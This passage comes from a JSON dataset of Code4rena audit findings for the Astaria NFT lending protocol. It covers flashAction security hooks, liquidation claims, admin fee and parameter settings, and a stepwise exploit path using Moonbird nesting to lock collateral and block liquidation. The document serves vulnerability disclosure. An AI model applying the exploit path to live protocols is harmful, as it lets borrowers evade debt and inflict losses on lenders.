Recommended Mitigation Steps\n\nWe recommend the protocol support ERC1155 transfer as well given the vast popular ERC1155 NFT in NFT community and NFT marketplace.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/127",
      "tags": [],
      "finders": []
    },
    {
      "id": "25855",
      "title": "[05] Security hook should not be set for a NFT that is not Uniswap V3 Position NFT",
      "impact": "LOW",
      "content": "\nSecurity hook should not be set in a NFT that is not Uniswap V3 Position NFT, otherwise the flash auction flow can be blocked.\n\n### Proof of Concept\n\nIf we look into the workflow of the flashAction, \n\nAccording to the documentation, the flashAction is implemented.\n\nhttps://docs.astaria.xyz/docs/protocol-mechanics/flashactions\n\n> FlashActions allow borrowers to take advantage of the utility of their locked NFTs. A FlashAction allows the user to unlock their underlying collateral and perform any action with the NFT as long as it is returned within the same block.\n\n> The FlashAction is a powerful tool that allows borrowers to perform actions on their NFTs without having to worry about the collateralization of their loan. We have a number of use cases for FlashActions, at launch however we plan to support any developer that would like to extend our FlashActions functionality.\n\n```solidity\n  function flashAction(\n    IFlashAction receiver,\n    uint256 collateralId,\n    bytes calldata data\n  ) external onlyOwner(collateralId) {\n    address addr;\n    uint256 tokenId;\n    CollateralStorage storage s = _loadCollateralSlot();\n    (addr, tokenId) = getUnderlying(collateralId);\n\n    if (!s.flashEnabled[addr]) {\n      revert InvalidCollateralState(InvalidCollateralStates.FLASH_DISABLED);\n    }\n\n    if (\n      s.LIEN_TOKEN.getCollateralState(collateralId) == bytes32(\"ACTIVE_AUCTION\")\n    ) {\n      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n    }\n\n    bytes32 preTransferState;\n    //look to see if we have a security handler for this asset\n\n    address securityHook = s.securityHooks[addr];\n    if (securityHook != address(0)) {\n      preTransferState = ISecurityHook(securityHook).getState(addr, tokenId);\n    }\n    // transfer the NFT to the destination optimistically\n\n    ClearingHouse(s.clearingHouse[collateralId]).transferUnderlying(\n      addr,\n      tokenId,\n      address(receiver)\n    );\n\n    //trigger the flash action on the receiver\n    if (\n      receiver.onFlashAction(\n        IFlashAction.Underlying(s.clearingHouse[collateralId], addr, tokenId),\n        data\n      ) != keccak256(\"FlashAction.onFlashAction\")\n    ) {\n      revert FlashActionCallbackFailed();\n    }\n\n    if (\n      securityHook != address(0) &&\n      preTransferState != ISecurityHook(securityHook).getState(addr, tokenId)\n    ) {\n      revert FlashActionSecurityCheckFailed();\n    }\n\n    // validate that the NFT returned after the call\n\n    if (\n      IERC721(addr).ownerOf(tokenId) != address(s.clearingHouse[collateralId])\n    ) {\n      revert FlashActionNFTNotReturned();\n    }\n  }\n```\n\nIn the implementation above, if the security hook is set, the validation code runs:\n\n```solidity\nbytes32 preTransferState;\n//look to see if we have a security handler for this asset\n\naddress securityHook = s.securityHooks[addr];\nif (securityHook != address(0)) {\n  preTransferState = ISecurityHook(securityHook).getState(addr, tokenId);\n}\n```\n\nand in the end of the flashAction:\n\n```solidity\nif (\n  securityHook != address(0) &&\n  preTransferState != ISecurityHook(securityHook).getState(addr, tokenId)\n) {\n  revert FlashActionSecurityCheckFailed();\n}\n```\n\nIf we look into the current implementation of the security hook:\n\n```solidity\n  function getState(address tokenContract, uint256 tokenId)\n    external\n    view\n    returns (bytes32)\n  {\n    (\n      uint96 nonce,\n      address operator,\n      ,\n      ,\n      ,\n      ,\n      ,\n      uint128 liquidity,\n      ,\n      ,\n      ,\n\n    ) = IV3PositionManager(positionManager).positions(tokenId);\n    return keccak256(abi.encode(nonce, operator, liquidity));\n  }\n```\n\nThe security hook should only applies to the Uniswap V3 Position NFT. However, in the current flashAction flow, if the security hook is set in a NFT that is not Uniswap V3 Position NFT, the security hook can revert the transaction and block the flashAction.\n\nThe security hook can be set via the file function in CollateralToken.sol\n\n```solidity\n  function file(File calldata incoming) public requiresAuth {\n    _file(incoming);\n  }\n\n  function _file(File calldata incoming) internal {\n    CollateralStorage storage s = _loadCollateralSlot();\n\n    FileType what = incoming.what;\n    bytes memory data = incoming.data;\n    if (what == FileType.AstariaRouter) {\n      address addr = abi.decode(data, (address));\n      s.ASTARIA_ROUTER = IAstariaRouter(addr);\n    } else if (what == FileType.SecurityHook) {\n      (address target, address hook) = abi.decode(data, (address, address));\n      s.securityHooks[target] = hook;\n    }\n```\n\nIf we look into the source code of the Uniswap V3 Position Manager.sol\n\nhttps://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/NonfungiblePositionManager.sol#L100\n\n```solidity\n    function positions(uint256 tokenId)\n        external\n        view\n        override\n        returns (\n            uint96 nonce,\n            address operator,\n            address token0,\n            address token1,\n            uint24 fee,\n            int24 tickLower,\n            int24 tickUpper,\n            uint128 liquidity,\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint128 tokensOwed0,\n            uint128 tokensOwed1\n        )\n    {\n        Position memory position = _positions[tokenId];\n        require(position.poolId != 0, 'Invalid token ID');\n        PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];\n        return (\n            position.nonce,\n            position.operator,\n            poolKey.token0,\n            poolKey.token1,\n            poolKey.fee,\n            position.tickLower,\n            position.tickUpper,\n            position.liquidity,\n            position.feeGrowthInside0LastX128,\n            position.feeGrowthInside1LastX128,\n            position.tokensOwed0,\n            position.tokensOwed1\n        );\n    }\n```\n\nNote the line:\n\n```solidity\nPosition memory position = _positions[tokenId];\nrequire(position.poolId != 0, 'Invalid token ID');\n```\n\nIt is possible that if the security hook turns on for a NFT that is not for Uniswap V3 Position, the query of `IV3PositionManager(positionManager).positions(tokenId)` can revert the flashAction transaction.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol validates the underlying NFT is a Uniswap V3 Position NFt if the security hook is set, otherwise, security hook should be disabled.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/109",
      "tags": [],
      "finders": []
    },
    {
      "id": "25854",
      "title": "[04] If an auction has no bidder, the NFT ownership should go back to the loan lenders instead of liquidator",
      "impact": "LOW",
      "content": "\nIf auction has no bidder, the liquidator can claim the NFT. The impact is severe:\n\n-  Lenders could suffer fund loss in some cases.\n-  The unfair mechanism will discourage future users.\n\n### Proof of Concept\n\nAfter the auction period, the collateral will be released to the initiator. Essentially, the initiator gets the NFT for free. But the lenders of the loan take the loss.\n\nHowever, the lenders should have the claim to the collateral, since originally the funds are provided by the lenders. If the collateral at the end is owned by whoever calls the liquidation function, it is not fair for the lenders. And will discourage future users to use the protocol.\n\nIn CollateralToken contract\n\n```solidity\n  function liquidatorNFTClaim(OrderParameters memory params) external {\n    CollateralStorage storage s = _loadCollateralSlot();\n\n    uint256 collateralId = params.offer[0].token.computeId(\n      params.offer[0].identifierOrCriteria\n    );\n    address liquidator = s.LIEN_TOKEN.getAuctionLiquidator(collateralId);\n    if (\n      s.collateralIdToAuction[collateralId] == bytes32(0) ||\n      liquidator == address(0)\n    ) {\n      //revert no auction\n      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n    }\n    if (\n      s.collateralIdToAuction[collateralId] != keccak256(abi.encode(params))\n    ) {\n      //revert auction params dont match\n      revert InvalidCollateralState(\n        InvalidCollateralStates.INVALID_AUCTION_PARAMS\n      );\n    }\n\n    if (block.timestamp < params.endTime) {\n      //auction hasn't ended yet\n      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n    }\n\n    Asset memory underlying = s.idToUnderlying[collateralId];\n    address tokenContract = underlying.tokenContract;\n    uint256 tokenId = underlying.tokenId;\n    ClearingHouse CH = ClearingHouse(payable(s.clearingHouse[collateralId]));\n    CH.settleLiquidatorNFTClaim();\n    _releaseToAddress(s, underlying, collateralId, liquidator);\n  }\n```\n\nNote the code:\n\n```solidity\n_releaseToAddress(s, underlying, collateralId, liquidator);\n```\n\nThe code above will send the NFT to liquidator inside of the lenders.\n\n### Recommended Mitigation Steps\n\nIf there is no bidder for the auction, allow the NFT to get auctioned for another chance.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/50",
      "tags": [],
      "finders": []
    },
    {
      "id": "25853",
      "title": "[03] Adversary can game the flashAuction feature to block further flashAuction after trading collateral token and make liquidatorNFTClaim function revert and block liquidation if the NFT is Moonbird",
      "impact": "LOW",
      "content": "\nIn the current implementation, according to https://docs.astaria.xyz/docs/protocol-mechanics/flashactions\n\n> FlashActions allow borrowers to take advantage of the utility of their locked NFTs. A FlashAction allows the user to unlock their underlying collateral and perform any action with the NFT as long as it is returned within the same block.\n\nThe corresponding implementation is in CollateralToken.sol\n\n```solidity\n  function flashAction(\n    IFlashAction receiver,\n    uint256 collateralId,\n    bytes calldata data\n  ) external onlyOwner(collateralId) {\n    address addr;\n    uint256 tokenId;\n    CollateralStorage storage s = _loadCollateralSlot();\n    (addr, tokenId) = getUnderlying(collateralId);\n\n    if (!s.flashEnabled[addr]) {\n      revert InvalidCollateralState(InvalidCollateralStates.FLASH_DISABLED);\n    }\n\n    if (\n      s.LIEN_TOKEN.getCollateralState(collateralId) == bytes32(\"ACTIVE_AUCTION\")\n    ) {\n      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n    }\n\n    bytes32 preTransferState;\n    //look to see if we have a security handler for this asset\n\n    address securityHook = s.securityHooks[addr];\n    if (securityHook != address(0)) {\n      preTransferState = ISecurityHook(securityHook).getState(addr, tokenId);\n    }\n    // transfer the NFT to the destination optimistically\n\n    ClearingHouse(s.clearingHouse[collateralId]).transferUnderlying(\n      addr,\n      tokenId,\n      address(receiver)\n    );\n\n    //trigger the flash action on the receiver\n    if (\n      receiver.onFlashAction(\n        IFlashAction.Underlying(s.clearingHouse[collateralId], addr, tokenId),\n        data\n      ) != keccak256(\"FlashAction.onFlashAction\")\n    ) {\n      revert FlashActionCallbackFailed();\n    }\n\n    if (\n      securityHook != address(0) &&\n      preTransferState != ISecurityHook(securityHook).getState(addr, tokenId)\n    ) {\n      revert FlashActionSecurityCheckFailed();\n    }\n\n    // validate that the NFT returned after the call\n\n    if (\n      IERC721(addr).ownerOf(tokenId) != address(s.clearingHouse[collateralId])\n    ) {\n      revert FlashActionNFTNotReturned();\n    }\n  }\n```\n\nThe code above did a few things: make sure the flashAction is enabled, make sure the NFT is not in auction, make sure owner the owner of the collateral token can call flashAction using onlyOwner(collateralId) modifier, then the code transfer the NFT to the receiver.\n\n```solidity\nClearingHouse(s.clearingHouse[collateralId]).transferUnderlying(\n  addr,\n  tokenId,\n  address(receiver)\n);\n```\n\nIn the end, the code checks if the caller of the flashAction return the NFT by checking the ownership of the NFT\n\n```solidity\nif (\n  IERC721(addr).ownerOf(tokenId) != address(s.clearingHouse[collateralId])\n) {\n  revert FlashActionNFTNotReturned();\n}\n```\n\nWe need to look into ClearingHouse(s.clearingHouse[collateralId]).transferUnderlying function call:\n\nIn ClearingHouse.sol\n\n```solidity\nfunction transferUnderlying(\naddress tokenContract,\nuint256 tokenId,\naddress target\n) external {\n\tIAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n\trequire(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n\tERC721(tokenContract).safeTransferFrom(address(this), target, tokenId);\n}\n```\n\nThe crucial part is that the normal safeTransferFrom is used.\n\n```solidity\nERC721(tokenContract).safeTransferFrom(address(this), target, tokenId);\n```\n\nHowever, if the tokenContract is Moonbird NFT, the adversary can game the flashAucton feature to block further flashAction after trading the collateral token.\n\nWe need to look into the MoonBird NFT.\n\nMoonbird NFT is one of the bluechip that has a large communtiy and high trading volume.\n\nhttps://cointelegraph.com/news/bluechip-nft-project-moonbirds-signs-with-hollywood-talent-agents-uta\n\nThis NFT MoonBird has a feature: bird nesting.\n\nhttps://www.moonbirds.xyz/\n\n> Moonbirds come with a unique PFP design that allows them to be locked up and nested without leaving your wallet.\n\n> As soon as your Moonbird is nested, they’ll begin to accrue additional benefits. As total nested time accumulates, you’ll see your Moonbird achieve new tier levels, upgrading their nest.\n\nThe important things is that: when nesting is activated, the normal transfer is disabled (meaning the NFT trading for nested bird is disabled because normal transfer will revert) but user can use a speical function safeTransferWhileNesting to move NFT around.\n\nHow is this feature implemented?\n\nHere is the function toggleNesting function\n\n```solidity\n/**\n@notice Changes the Moonbird's nesting status.\n*/\nfunction toggleNesting(uint256 tokenId)\n\tinternal\n\tonlyApprovedOrOwner(tokenId)\n{\n```\n\nhttps://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L319\n\nWhen the nesting is active, normal transfer is disabled. If the user tries to transfer while nesting, transaction will revert in \\_beforeTokenTransfers\n\nhttps://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L272\n\n```solidity\n/**\n@dev Block transfers while nesting.\n */\nfunction _beforeTokenTransfers(\n\taddress,\n\taddress,\n\tuint256 startTokenId,\n\tuint256 quantity\n) internal view override {\n\tuint256 tokenId = startTokenId;\n\tfor (uint256 end = tokenId + quantity; tokenId < end; ++tokenId) {\n\t\trequire(\n\t\t\tnestingStarted[tokenId] == 0 || nestingTransfer == 2,\n\t\t\t\"Moonbirds: nesting\"\n\t\t);\n\t}\n}\n```\n\nHere is an example transaction that revert when user tries to transfer while nesting.\n\nhttps://etherscan.io/tx/0x21caf32e33f37d808054bf9ef33273a1347961dfc914819fc972cc5f44d7e62e\n\nHere is an example transaction that users try to toggle nesting\n\nhttps://etherscan.io/tx/0xefc7b7e683b17b623b96c628e684613ab7e637f5e74dec7abdedebb99b4e64d1\n\nIf the NFT bird is in nesting, the user can call a speical function safeTransferWhileNesting to move NFT around.\n\nhttps://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L258\n\n```solidity\nfunction safeTransferWhileNesting(\n\taddress from,\n\taddress to,\n\tuint256 tokenId\n) external {\n\trequire(ownerOf(tokenId) == _msgSender(), \"Moonbirds: Only owner\");\n\tnestingTransfer = 2;\n\tsafeTransferFrom(from, to, tokenId);\n\tnestingTransfer = 1;\n}\n```\n\nExample transaction for safeTransferWhileNesting\n\nhttps://etherscan.io/tx/0x8d80610ff84c0f874fef28b351852e206fc38fe2818627881e437ed661d77fda\n\n**Ok, now we can formalize the exploit path:**\n\n1. A adversay acquires the collateral token so he can call flash action.\n2. He calls the flash auction, and within the transaction he hold the moonbird NFT.\n3. He toggle the nesting on, and use safeTransferWhileNesting to transfer the NFT back.\n4. The ownership validation code will pass because the NFT is transferred back.\n\n```solidity\nif (\n  IERC721(addr).ownerOf(tokenId) != address(s.clearingHouse[collateralId])\n) {\n  revert FlashActionNFTNotReturned();\n}\n```\n\n5. The adversary sell collateral token to others. But other user tries to use flash auction on the moonbird.\n6. Transaction revert in safeTransferFrom because while the moonbird nesting is on, safeTransferWhileNesting needs to be called to transfer NFT, but protocol does not support such function and the protocol does not support the transction that toggle the moonbird nesting off.\n\n```solidity\n\tERC721(tokenContract).safeTransferFrom(address(this), target, tokenId);\n```\n\nThe impact is severe, the new owner cannot use flashAuction.\n\nIn fact, all ERC721(tokenContract).safeTransferFrom call is blocked, the NFT cannot be liquidated because normal liquidation also requires transferFrom to change the ownership and settle the trade. \n\nliquidatorNFTClaim also revert because the function calls:\n\n```solidity\nClearingHouse CH = ClearingHouse(payable(s.clearingHouse[collateralId]));\nCH.settleLiquidatorNFTClaim();\n_releaseToAddress(s, underlying, collateralId, liquidator);\n```\n\nwhich calls \\_releaseToAddress\n\nwhich calls:\n\n```solidity\nfunction _releaseToAddress(\nCollateralStorage storage s,\nAsset memory underlyingAsset,\nuint256 collateralId,\naddress releaseTo\n) internal {\nClearingHouse(s.clearingHouse[collateralId]).transferUnderlying(\n  underlyingAsset.tokenContract,\n  underlyingAsset.tokenId,\n  releaseTo\n);\nemit ReleaseTo(\n  underlyingAsset.tokenContract,\n  underlyingAsset.tokenId,\n  releaseTo\n);\n}\n```\n\nwhich calls transferUnderlying, which use ERC721(tokenContract).safeTransferFrom, which reverts while the moonbird nesting is on.\n\nthe function releaseToAddress is blocked and the NFT is locked in CollateralToken\n\n```solidity\nfunction releaseToAddress(uint256 collateralId, address releaseTo)\npublic\nreleaseCheck(collateralId)\nonlyOwner(collateralId)\n{\nCollateralStorage storage s = _loadCollateralSlot();\n\nif (msg.sender != ownerOf(collateralId)) {\n  revert InvalidSender();\n}\nAsset memory underlying = s.idToUnderlying[collateralId];\naddress tokenContract = underlying.tokenContract;\n_burn(collateralId);\ndelete s.idToUnderlying[collateralId];\n_releaseToAddress(s, underlying, collateralId, releaseTo);\n}\n```\n\nWho have such incentives to exploits this feature? For example, a user use moonbird to borrow 10 ETH, but he does not want to pay the outstanding debt and does not want to get the NFT liquidated. He can exploit the moonbird to lock NFT. Without liquidating the NFT and locking the NFT, the lender bears the loss on the bad debt.\n\n### Coded POC\n\nLet us see the normal flashAction flow and then see how the above-mentioned exploit path can block further flashAction.\n\n*Note: see warden's [original submission](https://github.com/code-423n4/2023-01-astaria-findings/issues/70) for full details.*\n\n### Tools Used\n\nManual Review, Foundry\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol whitelist the NFT address that can be used in the protocol to make sure such edge case does not impact the borrower and lender.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/70",
      "tags": [],
      "finders": []
    },
    {
      "id": "25852",
      "title": "[02] New Protocol parameter setting should not be applied to old loan term and state, especially the fee setting",
      "impact": "LOW",
      "content": "\nThe admin has a lot of power. One of the power in admin's hand is that the admin can call function file in AstariaRouter.sol to change the parameter change.\n\n```solidity\n  function file(File calldata incoming) public requiresAuth {\n    _file(incoming);\n  }\n\n  function _file(File calldata incoming) internal {\n    RouterStorage storage s = _loadRouterSlot();\n    FileType what = incoming.what;\n    bytes memory data = incoming.data;\n    if (what == FileType.AuctionWindow) {\n      (uint256 window, uint256 windowBuffer) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      s.auctionWindow = window.safeCastTo32();\n      s.auctionWindowBuffer = windowBuffer.safeCastTo32();\n    } else if (what == FileType.LiquidationFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.liquidationFeeNumerator = numerator.safeCastTo32();\n      s.liquidationFeeDenominator = denominator.safeCastTo32();\n    } else if (what == FileType.ProtocolFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.protocolFeeNumerator = numerator.safeCastTo32();\n      s.protocolFeeDenominator = denominator.safeCastTo32();\n    } else if (what == FileType.BuyoutFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.buyoutFeeNumerator = numerator.safeCastTo32();\n      s.buyoutFeeDenominator = denominator.safeCastTo32();\n    } else if (what == FileType.MinInterestBPS) {\n      uint256 value = abi.decode(data, (uint256));\n      s.minInterestBPS = value.safeCastTo32();\n    } else if (what == FileType.MinDurationIncrease) {\n      uint256 value = abi.decode(data, (uint256));\n      s.minDurationIncrease = value.safeCastTo32();\n    } else if (what == FileType.MinEpochLength) {\n      s.minEpochLength = abi.decode(data, (uint256)).safeCastTo32();\n    } else if (what == FileType.MaxEpochLength) {\n      s.maxEpochLength = abi.decode(data, (uint256)).safeCastTo32();\n    } else if (what == FileType.MaxInterestRate) {\n      s.maxInterestRate = abi.decode(data, (uint256)).safeCastTo88();\n    } else if (what == FileType.FeeTo) {\n      address addr = abi.decode(data, (address));\n      if (addr == address(0)) revert InvalidFileData();\n      s.feeTo = addr;\n    } else if (what == FileType.StrategyValidator) {\n      (uint8 TYPE, address addr) = abi.decode(data, (uint8, address));\n      if (addr == address(0)) revert InvalidFileData();\n      s.strategyValidators[TYPE] = addr;\n    } else {\n      revert UnsupportedFile();\n    }\n\n    emit FileUpdated(what, data);\n  }\n\n```\n\nThe parameters that can be changed are \n\n- **the auction window and auction window buffer**\n- **numerator and denominator for liquidation fee**\n- **numerator and denominator for protocol fee**\n- **numerator and denominator for buy out fee**\n- **minInterestBPS, minDurationIncrease, and minEpochLength and maxEpochLength and MaxInterest rate**\n\nThe rest of change is address change. The above change is the parameter related change.\n\nNow let us study the impact of adjusting these parameters:\n\n**Change auction window and auction window buffer does not affect old and ongoing liquidation because when the liquidation is created, the code take a snapshot of auctionWindowMax and apply to liquidation auction**\n\n```solidity\nuint256 auctionWindowMax = s.auctionWindow + s.auctionWindowBuffer;\n\ns.LIEN_TOKEN.stopLiens(\n  stack[position].lien.collateralId,\n  auctionWindowMax,\n  stack,\n  msg.sender\n);\nemit Liquidation(stack[position].lien.collateralId, position);\nlistedOrder = s.COLLATERAL_TOKEN.auctionVault(\n  ICollateralToken.AuctionVaultParams({\n\tsettlementToken: stack[position].lien.token,\n\tcollateralId: stack[position].lien.collateralId,\n\tmaxDuration: auctionWindowMax,\n\tstartingPrice: stack[0].lien.details.liquidationInitialAsk,\n\tendingPrice: 1_000 wei\n  })\n);\n```\n\nChanging numerator and denominator for liquidation fee can affect ongoing liquidation before the liquidation is settled. The liquidation fee is adjust up before the liqudation is settled. The amount of payment may be not enough to pay the oustanding debt and lender can bear the loss.\n\n```solidity\nILienToken.AuctionStack[] storage stack = s.auctionStack.stack;\n\nuint256 liquidatorPayment = ASTARIA_ROUTER.getLiquidatorFee(payment);\n\nERC20(paymentToken).safeTransfer(\n  s.auctionStack.liquidator,\n  liquidatorPayment\n);\n\nERC20(paymentToken).safeApprove(\n  address(ASTARIA_ROUTER.TRANSFER_PROXY()),\n  payment - liquidatorPayment\n);\n```\n\nChanging numerator and denominator for protocol fee can does not impact on-going loan term because the old protocol fee is paid before.\n\n```solidity\n  function _requestLienAndIssuePayout(\n    IAstariaRouter.Commitment calldata c,\n    address receiver\n  )\n    internal\n    returns (\n      uint256 newLienId,\n      ILienToken.Stack[] memory stack,\n      uint256 slope,\n      uint256 payout\n    )\n  {\n    _validateCommitment(c, receiver);\n    (newLienId, stack, slope) = ROUTER().requestLienPosition(c, recipient());\n    payout = _handleProtocolFee(c.lienRequest.amount);\n    ERC20(asset()).safeTransfer(receiver, payout);\n  }\n\n  function _handleProtocolFee(uint256 amount) internal returns (uint256) {\n    address feeTo = ROUTER().feeTo();\n    bool feeOn = feeTo != address(0);\n    if (feeOn) {\n      uint256 fee = ROUTER().getProtocolFee(amount);\n\n      unchecked {\n        amount -= fee;\n      }\n      ERC20(asset()).safeTransfer(feeTo, fee);\n    }\n    return amount;\n  }\n```\n\nChanging buyout fee can impact ongoing lien buyout for sure. Inconsistent buyout fee can be paid in different buyoutLien transaction.\n\n```solidity\n  /**\n   * @notice Purchase a LienToken for its buyout price.\n   * @param params The LienActionBuyout data specifying the lien position, receiver address, and underlying CollateralToken information of the lien.\n   */\n  function buyoutLien(ILienToken.LienActionBuyout calldata params)\n    external\n    validateStack(params.encumber.lien.collateralId, params.encumber.stack)\n    returns (Stack[] memory, Stack memory newStack)\n  {\n    if (block.timestamp >= params.encumber.stack[params.position].point.end) {\n      revert InvalidState(InvalidStates.EXPIRED_LIEN);\n    }\n    LienStorage storage s = _loadLienStorageSlot();\n    if (!s.ASTARIA_ROUTER.isValidVault(msg.sender)) {\n      revert InvalidSender();\n    }\n    return _buyoutLien(s, params);\n  }\n```\n\nChanging minInterestBPS, minDurationIncrease can impact ongoing loan's refinance condition.\n\n```solidity\nfunction isValidRefinance(\nILienToken.Lien calldata newLien,\nuint8 position,\nILienToken.Stack[] calldata stack\n) public view returns (bool) {\nRouterStorage storage s = _loadRouterSlot();\nuint256 maxNewRate = uint256(stack[position].lien.details.rate) -\n  s.minInterestBPS;\n\nif (newLien.collateralId != stack[0].lien.collateralId) {\n  revert InvalidRefinanceCollateral(newLien.collateralId);\n}\nreturn\n  (newLien.details.rate <= maxNewRate &&\n\tnewLien.details.duration + block.timestamp >=\n\tstack[position].point.end) ||\n  (block.timestamp + newLien.details.duration - stack[position].point.end >=\n\ts.minDurationIncrease &&\n\tnewLien.details.rate <= stack[position].lien.details.rate);\n}\n```\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol take a snapshot of the parameter when the loan term is created and not let ongoing changed parameter setting affect the active loan which is not fair for both lender and borrower.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/76",
      "tags": [],
      "finders": []
    },
    {
      "id": "25851",
      "title": "[01] Lack of reasonable boundary for parameter setting in fee setting and liquidation auction length and refinance setting and epoch length",
      "impact": "LOW",
      "content": "\nAccording to the documentation,\n\n<https://docs.astaria.xyz/docs/protocol-mechanics/liquidations>\n\n> Auction lengths are set to 72 hours, and will follow a Dutch Auction process.\n\nIn the constructor of the AstariaRouter.sol\n\n```solidity\n    s.auctionWindow = uint32(2 days);\n    s.auctionWindowBuffer = uint32(1 days);\n```\n\nbut these parameter can be adjusted with no boundary restriction in the function file\n\n```solidity\n  function _file(File calldata incoming) internal {\n    RouterStorage storage s = _loadRouterSlot();\n    FileType what = incoming.what;\n    bytes memory data = incoming.data;\n    if (what == FileType.AuctionWindow) {\n      (uint256 window, uint256 windowBuffer) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      s.auctionWindow = window.safeCastTo32();\n      s.auctionWindowBuffer = windowBuffer.safeCastTo32();\n    }\n```\n\nAdmin can adjust the auction length to very short or very long, which violates the documentation.\n\nIf the admin adjust the auction length to very short, for example, 2 hours, the auction time is too short to let people purchase off the outstanding debt, and the lender has to bear the loss.\n\nIf the auction length is too long, for example, 2000 days, this basically equal to lock the NFT auction fund and the lender will not get paid either.\n\nAccording to documentation\n\n<https://docs.astaria.xyz/docs/protocol-mechanics/refinance>\n\n> An improvement in terms is considered if either of these conditions is met:<br>\n> The loan interest rate decrease by more than 0.05%.<br>\n> The loan duration increases by more than 14 days.\n\nHowever, in the constructor of the AstariaRouter.sol such parameter is not enforced. The s.minDurationIncrease is set to 5 days, not 14 days.\n\n```solidity\ns.minDurationIncrease = uint32(5 days);\n```\n\nwhich impact the refinance logic\n\n```solidity\n  function isValidRefinance(\n    ILienToken.Lien calldata newLien,\n    uint8 position,\n    ILienToken.Stack[] calldata stack\n  ) public view returns (bool) {\n    RouterStorage storage s = _loadRouterSlot();\n    uint256 maxNewRate = uint256(stack[position].lien.details.rate) -\n      s.minInterestBPS;\n\n    if (newLien.collateralId != stack[0].lien.collateralId) {\n      revert InvalidRefinanceCollateral(newLien.collateralId);\n    }\n    return\n      (newLien.details.rate <= maxNewRate &&\n        newLien.details.duration + block.timestamp >=\n        stack[position].point.end) ||\n      (block.timestamp + newLien.details.duration - stack[position].point.end >=\n        s.minDurationIncrease &&\n        newLien.details.rate <= stack[position].lien.details.rate);\n  }\n```\n\nThe relevant parameter s.minInterestBPS and s.minDurationIncrease can be adjusted in the function file with no boundary setting.\n\n```solidity\n} else if (what == FileType.MinInterestBPS) {\n  uint256 value = abi.decode(data, (uint256));\n  s.minInterestBPS = value.safeCastTo32();\n} else if (what == FileType.MinDurationIncrease) {\n  uint256 value = abi.decode(data, (uint256));\n  s.minDurationIncrease = value.safeCastTo32();\n} \n```\n\nThe impact is that if the The loan duration increases duration is too long and the interest decreases too much, this may favor the lender too much and not fair to borrower. The payment to lender can be infinitely delayed.\n\nIf the loan duration increase duration is too short and the interest decrease is too small, the refinance become pointless.\n\nIf the admin change the protocol fee, buyout fee or the epoch length or the max interest rate with no reasonable boundary by calling `Astaria#file`, the impact is severe.\n\n```solidity\n    } else if (what == FileType.ProtocolFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.protocolFeeNumerator = numerator.safeCastTo32();\n      s.protocolFeeDenominator = denominator.safeCastTo32();\n    } else if (what == FileType.BuyoutFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.buyoutFeeNumerator = numerator.safeCastTo32();\n      s.buyoutFeeDenominator = denominator.safeCastTo32();\n    }\n```\n\nand\n\n```solidity\nelse if (what == FileType.MinDurationIncrease) {\n  uint256 value = abi.decode(data, (uint256));\n  s.minDurationIncrease = value.safeCastTo32();\n} else if (what == FileType.MinEpochLength) {\n  s.minEpochLength = abi.decode(data, (uint256)).safeCastTo32();\n} else if (what == FileType.MaxEpochLength) {\n  s.maxEpochLength = abi.decode(data, (uint256)).safeCastTo32();\n} else if (what == FileType.MaxInterestRate) {\n  s.maxInterestRate = abi.decode(data, (uint256)).safeCastTo88();\n} \n```\n\nThe admin can charge high liqudation fee and there may not be enough fund left to pay out the outstanding debt.\n\nThe admin can charge high buyout fee, which impact the 